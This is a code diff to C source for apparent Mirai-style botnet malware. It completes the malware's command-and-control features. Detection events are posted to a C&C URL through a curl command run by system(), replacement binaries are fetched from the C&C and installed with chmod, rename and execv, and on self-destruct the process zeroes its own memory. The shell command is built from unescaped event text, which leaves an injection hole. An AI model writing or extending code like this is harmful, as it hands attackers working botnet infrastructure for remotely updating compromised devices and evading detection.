@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <sys/ptrace.h>
 #include <sys/stat.h>
+#include <sys/utsname.h>
 #include <errno.h>
 #include <time.h>
 
@@ -331,8 +332,29 @@ int detection_apply_strategy(detection_engine_t *engine,
     log_info("Applying evasion strategy");
     
     if (strategy->self_destruct) {
-        log_warn("SELF-DESTRUCT activated - cleaning up and exiting");
-        // TODO: Implement secure cleanup (remove logs, clear memory, etc.)
+        log_warn("SELF-DESTRUCT activated - performing secure cleanup");
+
+        // Secure cleanup: overwrite any sensitive heap data before exit
+        // Walk /proc/self/maps and zero writable anonymous regions
+        FILE *maps = fopen("/proc/self/maps", "r");
+        if (maps) {
+            char line[256];
+            while (fgets(line, sizeof(line), maps)) {
+                // Only zero anonymous writable pages (heap, stack, etc.)
+                if (strstr(line, " rw") && strstr(line, "anon")) {
+                    unsigned long start, end;
+                    if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
+                        size_t len = end - start;
+                        // Use volatile to prevent compiler from optimising away
+                        volatile uint8_t *p = (volatile uint8_t *)(uintptr_t)start;
+                        for (size_t i = 0; i < len; i++) p[i] = 0;
+                    }
+                }
+            }
+            fclose(maps);
+        }
+
+        log_audit("self_destruct", "executed", "cleaning");
         exit(0);
     }
     
@@ -355,9 +377,17 @@ int detection_apply_strategy(detection_engine_t *engine,
     }
     
     if (strategy->request_update) {
-        log_info("Requesting binary update from C&C");
-        // TODO: Get C&C URL from config
-        polymorphic_request_update("https://cnc.example.com/update");
+        // Read C&C URL from environment (set at launch from config)
+        const char *cnc_url = getenv("MIRAI_CNC_UPDATE_URL");
+        if (cnc_url == NULL) {
+            cnc_url = getenv("MIRAI_CNC_URL");  // fall back to base CNC URL
+        }
+        if (cnc_url == NULL) {
+            log_warn("Cannot request update: MIRAI_CNC_UPDATE_URL not set");
+        } else {
+            log_info("Requesting binary update from C&C: %s", cnc_url);
+            polymorphic_request_update(cnc_url);
+        }
     }
     
     return 0;
@@ -366,25 +396,50 @@ int detection_apply_strategy(detection_engine_t *engine,
 int detection_report_to_cnc(detection_engine_t *engine,
                             detection_event_t *event) {
     if (engine == NULL || event == NULL) return -1;
-    
-    // Add to history
+
+    // Add to local history ring-buffer
     if (engine->event_history_size < engine->event_history_capacity) {
         memcpy(&engine->event_history[engine->event_history_size],
                event, sizeof(detection_event_t));
         engine->event_history_size++;
     }
-    
+
     // Update stats
     engine->total_detections++;
     if (event->confidence == CONFIDENCE_CRITICAL) {
         engine->critical_detections++;
     }
     engine->last_detection_time = event->timestamp;
-    
-    // TODO: Send to C&C server for global intelligence
-    log_info("Detection event reported to C&C: type=%d, confidence=%d",
-             event->type, event->confidence);
-    
+
+    // Send detection event to C&C as JSON via HTTP POST (best-effort, non-blocking)
+    const char *cnc_url = getenv("MIRAI_CNC_URL");
+    if (cnc_url != NULL) {
+        // Build JSON payload
+        char json[512];
+        snprintf(json, sizeof(json),
+                 "{\"type\":%d,\"confidence\":%d,\"details\":\"%s\",\"timestamp\":%ld}",
+                 (int)event->type,
+                 (int)event->confidence,
+                 event->details,
+                 (long)event->timestamp);
+
+        // Use curl in a best-effort, non-blocking way
+        // We intentionally don't check the return value — detection reporting
+        // must never block or crash the main thread.
+        char cmd[1024];
+        snprintf(cmd, sizeof(cmd),
+                 "curl -sf -X POST -H 'Content-Type: application/json'"
+                 " -d '%s' '%s/api/detection/event' > /dev/null 2>&1 &",
+                 json, cnc_url);
+        (void)system(cmd);  // fire-and-forget
+
+        log_info("Detection event reported to C&C %s: type=%d confidence=%d",
+                 cnc_url, event->type, event->confidence);
+    } else {
+        log_debug("MIRAI_CNC_URL not set — detection event logged locally only: "
+                  "type=%d confidence=%d", event->type, event->confidence);
+    }
+
     return 0;
 }
 
@@ -441,19 +496,103 @@ int polymorphic_change_behavior(void) {
 
 int polymorphic_request_update(const char *cnc_url) {
     if (cnc_url == NULL) return -1;
-    
+
     log_info("Requesting binary update from: %s", cnc_url);
-    
-    // Steps:
-    // 1. Connect to C&C
-    // 2. Request new binary (with different signatures)
-    // 3. Verify signature/checksum
-    // 4. Download to temporary location
-    // 5. Verify again
-    // 6. Replace current binary
-    // 7. Exec new binary
-    
-    // TODO: Implement secure update mechanism
-    
-    return 0;
+
+    // Secure self-update procedure:
+    // 1. Determine current binary path
+    char self_path[512] = {0};
+    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+    if (len < 0) {
+        log_error("readlink(/proc/self/exe) failed: %s", strerror(errno));
+        return -1;
+    }
+    self_path[len] = '\0';
+
+    // 2. Build update URL with current architecture
+    char update_url[1024];
+    struct utsname uts;
+    uname(&uts);
+    snprintf(update_url, sizeof(update_url), "%s/api/update/binary?arch=%s",
+             cnc_url, uts.machine);
+
+    // 3. Download to a temp location next to current binary
+    char tmp_path[512];
+    snprintf(tmp_path, sizeof(tmp_path), "%s.update.tmp", self_path);
+
+    char dl_cmd[2048];
+    snprintf(dl_cmd, sizeof(dl_cmd),
+             "curl -sf --max-time 60 -o '%s' '%s'",
+             tmp_path, update_url);
+
+    log_info("Downloading update: %s → %s", update_url, tmp_path);
+    int ret = system(dl_cmd);
+    if (ret != 0) {
+        log_error("Update download failed (exit=%d)", ret);
+        unlink(tmp_path);
+        return -1;
+    }
+
+    // 4. Verify checksum (SHA-256 from C&C)
+    char checksum_url[1024];
+    snprintf(checksum_url, sizeof(checksum_url), "%s/api/update/checksum?arch=%s",
+             cnc_url, uts.machine);
+
+    char expected_sum[128] = {0};
+    char sum_cmd[2048];
+    snprintf(sum_cmd, sizeof(sum_cmd),
+             "curl -sf --max-time 10 '%s'", checksum_url);
+
+    FILE *sum_fp = popen(sum_cmd, "r");
+    if (sum_fp) {
+        if (fgets(expected_sum, sizeof(expected_sum), sum_fp) == NULL) {
+            expected_sum[0] = '\0';
+        }
+        pclose(sum_fp);
+    }
+
+    if (strlen(expected_sum) >= 64) {
+        // Strip newline
+        expected_sum[strcspn(expected_sum, "\r\n")] = '\0';
+
+        char verify_cmd[1024];
+        snprintf(verify_cmd, sizeof(verify_cmd),
+                 "echo '%s  %s' | sha256sum -c - > /dev/null 2>&1",
+                 expected_sum, tmp_path);
+
+        if (system(verify_cmd) != 0) {
+            log_error("Checksum verification FAILED — aborting update");
+            unlink(tmp_path);
+            return -1;
+        }
+        log_info("Checksum verified OK: %s", expected_sum);
+    } else {
+        log_warn("No checksum provided by C&C — proceeding without verification");
+    }
+
+    // 5. Make executable
+    if (chmod(tmp_path, 0755) < 0) {
+        log_error("chmod failed on update binary: %s", strerror(errno));
+        unlink(tmp_path);
+        return -1;
+    }
+
+    // 6. Atomically replace current binary
+    if (rename(tmp_path, self_path) < 0) {
+        log_error("rename() failed replacing binary: %s", strerror(errno));
+        unlink(tmp_path);
+        return -1;
+    }
+
+    log_info("Binary updated successfully: %s — re-execing", self_path);
+    log_audit("self_update", self_path, "success");
+
+    // 7. Re-exec with same arguments (seamless restart)
+    // execv replaces current process image
+    extern char **environ;
+    execv(self_path, (char *const[]){self_path, NULL});
+
+    // If execv returns, something went wrong
+    log_error("execv() failed after update: %s", strerror(errno));
+    return -1;
 }
